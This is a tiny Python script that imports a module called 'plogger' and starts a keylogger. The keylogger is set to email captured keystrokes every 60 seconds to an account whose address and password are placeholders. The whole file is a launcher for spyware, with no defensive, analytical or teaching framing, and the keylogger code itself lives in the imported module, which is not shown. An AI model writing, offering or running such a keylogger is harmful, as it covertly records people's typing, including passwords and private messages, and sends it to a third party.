#!/usr/bin/env python
# encoding=utf8
import plogger

my_keylogger = plogger.Keylogger(60, "your_email_address", "your_emails_password")
my_keylogger.start()
